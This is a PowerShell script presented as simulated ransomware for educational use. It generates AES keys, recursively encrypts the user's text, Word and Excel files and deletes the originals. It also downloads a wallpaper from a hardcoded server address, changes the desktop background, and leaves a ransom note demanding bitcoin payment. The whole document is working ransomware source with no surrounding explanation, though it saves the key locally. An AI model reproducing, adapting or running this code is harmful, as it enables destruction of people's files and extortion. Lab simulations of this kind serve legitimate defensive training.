# Simulated Ransomware Script
# Author: Tim Drobny
# For educational use ONLY!

# Set Target and Exclusions
$TargetDir = "$env:UserProfile"
$Desktop = "$env:UserProfile\Desktop"
$FileTypes = "*.txt", "*.docx", "*.xlsx"
$ExcludedFiles = "*.pcap"
$ServerIP = "192.168.61.26:8080"
$WallpaperUrl = "http://$ServerIP/Wallpaper.png"
$LocalWallpaperPath = "$TargetDir\wallpaper.png"

# Create Keys and save key file for decryption
$EncryptionKey = [System.Convert]::ToBase64String((New-Object Security.Cryptography.AesManaged).Key)
$EncryptionIV = [System.Convert]::ToBase64String((New-Object Security.Cryptography.AesManaged).IV)
$KeyFile = Join-Path -Path $TargetDir -ChildPath "encryption_key.txt1"
Set-Content -Path $KeyFile -Value "$EncryptionKey`n$EncryptionIV" -Force

# Function to encrypt file
function Encrypt-File {
    param (
	[string]$FilePath,
	[string]$Key,
	[string]$IV
    )
    $PlainBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $AES = [System.Security.Cryptography.Aes]::Create()
    $AES.Key = [System.Convert]::FromBase64String($Key)
    $AES.IV = [System.Convert]::FromBase64String($IV)
    $Encryptor = $AES.CreateEncryptor()
    $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
    [System.IO.File]::WriteAllBytes("$FilePath.encrypted", $EncryptedBytes)
    Remove-Item -Path $FilePath -Force
}

# Function to change wallpaper
function Set-DesktopBackground {
    param ([string]$ImagePath)
    Add-Type -TypeDefinition @"
	using System;
	using System.Runtime.InteropServices;
	public class Wallpaper {
	    [DllImport("user32.dll", CharSet = CharSet.Auto)]
	    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
	}
"@
    [Wallpaper]::SystemParametersInfo(0x0014, 0, $ImagePath, 0x01 -bor 0x02)
}

try {
    Invoke-WebRequest -Uri $WallpaperUrl -Outfile $LocalWallpaperPath -UseBasicParsing
    Write-Output "DL Image"
} catch {
    Write-Output "Counldn't Download Image"
    exit
}

# Check if path exists
if (-Not (Test-Path $TargetDir)) {
    Write-Output "No target-dir, exiting..."
    exit
}

# Iterate over all files in target directory and run encryption
Get-ChildItem -Path $TargetDir -Recurse -File -Include $FileTypes | ForEach-Object {
    $FilePath = $_.FullName

    if ($ExcludedFiles -notcontains $_.Name) {
	Write-Output "Encrypting: $FilePath"
	Encrypt-File -FilePath $FilePath -Key $EncryptionKey -IV $EncryptionIV
    }
}

# Change Wallpaper
Set-DesktopBackground -ImagePath $LocalWallpaperPath

# Create ransom note
Write-Output "D:  $Desktop"
$RansomNotePath = Join-Path -Path "$Desktop" -ChildPath "RansomNote.txt"
$RansomNote = @"
--- Ransom Note ---
Your files have been encrypted.
Please pay 500$ per encrypted system to this bitcoin wallet:
-insert wallet here-
"@

Set-Content -Path $RansomNotePath -Value $RansomNote -Force
Write-Output "Ransom Note deployed at $RansomNotePath"

Write-Output "Simulation Completed"
